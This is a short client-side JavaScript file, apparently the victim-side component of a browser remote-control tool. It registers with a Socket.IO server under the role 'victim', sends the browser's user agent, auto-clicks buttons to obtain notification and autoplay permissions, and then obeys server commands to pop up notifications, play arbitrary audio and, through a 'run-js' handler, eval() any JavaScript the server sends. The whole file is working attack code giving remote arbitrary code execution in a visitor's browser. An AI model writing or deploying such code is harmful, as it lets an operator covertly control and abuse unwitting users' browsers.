var socket = io();
socket.emit('conn', {
  role: 'victim',
  userAgent: navigator.userAgent,
});

let ok = 0;

const getRidOfWarning = () => {
  if (ok == 2) {
    document.querySelector('#setup').style.display = 'none';
    socket.emit('permission', 'all-grant')
  }
}

const grantNotification = document.querySelector('#grant-notification');
grantNotification.addEventListener('click', () => {
  Notification.requestPermission().then((result) => {
    if (result == 'granted') {
      grantNotification.style.display = 'none';
      socket.emit('permission', 'notification-grant')
      ok++;
      getRidOfWarning();
    }
    else if (result == 'denied') {
      console.log('notification not allowed');
      socket.emit('permission', 'notification-deny')
    }
  });
});
grantNotification.click();

const grantAutoplay = document.querySelector('#grant-autoplay');
grantAutoplay.addEventListener('click', () => {
  setTimeout(() => {
    const audio = new Audio('https://raw.githubusercontent.com/anars/blank-audio/master/1-second-of-silence.mp3');
    audio.play().then(() => {
      grantAutoplay.style.display = 'none';
      socket.emit('permission', 'autoplay-grant')
      ok++;
      getRidOfWarning();
    }).catch(() => {
      console.log('autoplay not allowed');
      socket.emit('permission', 'autoplay-deny')
    });
  }, 100);
});
grantAutoplay.click();


socket.on('ping', () => {
  console.log('ping');
  socket.emit('pong');
});
socket.on('notification', (msg) => {
  new Notification(msg);
});
let audio = null;
socket.on('music', (url) => {
  audio = new Audio(url);
  audio.play();
});
socket.on('stop-music', (url) => {
  audio.pause();
});
socket.on('run-js', (code) => {
  eval(code);
});